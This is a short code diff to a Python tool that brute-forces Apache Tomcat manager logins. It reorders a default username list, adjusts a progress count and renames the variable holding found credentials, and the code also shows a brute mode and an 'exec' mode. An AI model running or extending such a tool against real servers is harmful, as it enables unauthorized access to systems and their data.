@@ -28,11 +28,11 @@ progress_bar = Progress(
 
 # common username list of tomcat's most common username - serve as backup if no user list
 common_username: list[str] = [
-    "admin",
+    "tomcat",
     "manager",
     "role1",
     "root",
-    "tomcat"
+    "admin"
 ]
 
 
@@ -60,7 +60,7 @@ def brute(url: str, userlist: str, wordlist: str) -> tuple[str, str] | bool:
 
                         # TODO : add an option --continue-on-success
                         if response.status_code == 200:
-                            progress.update(task, completed=length_wordlist)
+                            progress.update(task, completed=length_wordlist * len(common_username))
                             time.sleep(1)
                             return username, password
                         else:
@@ -157,13 +157,13 @@ def main():
             passwords = args.wordlist
             cprint("[*]", "blue", end="")
             print(' Brute force is running...')
-            run_bf = brute(url, userlist, passwords)
-            if not run_bf:
+            credentials_found = brute(url, userlist, passwords)
+            if not credentials_found:
                 cprint("[-]", "red", end="")
                 print(" No user or password is match ! :(")
             else:
                 cprint("[+]", "green", end="")
-                print(f" find user and password : {run_bf[0]}:{run_bf[1]}")
+                print(f" find user and password : {credentials_found[0]}:{credentials_found[1]}")
 
                 # settings for exec mode
     elif args.mode == "exec":
